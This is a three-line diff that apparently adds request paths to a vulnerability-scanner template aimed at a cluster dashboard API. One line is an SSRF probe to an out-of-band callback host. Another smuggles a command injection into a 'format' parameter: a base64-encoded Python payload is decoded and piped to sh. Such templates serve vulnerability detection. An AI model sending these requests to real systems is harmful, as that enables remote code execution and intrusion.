@@ -1,0 +1,3 @@
+/log_proxy?url=http://{{interactsh-url}}
+/nodes?view=summary
+/worker/cpu_profile?pid={{pid}}&ip={{node_ip}}&duration=5&native=0&format=%60echo%20{{base64(python_payload)}}|base64$IFS-d|sh%60
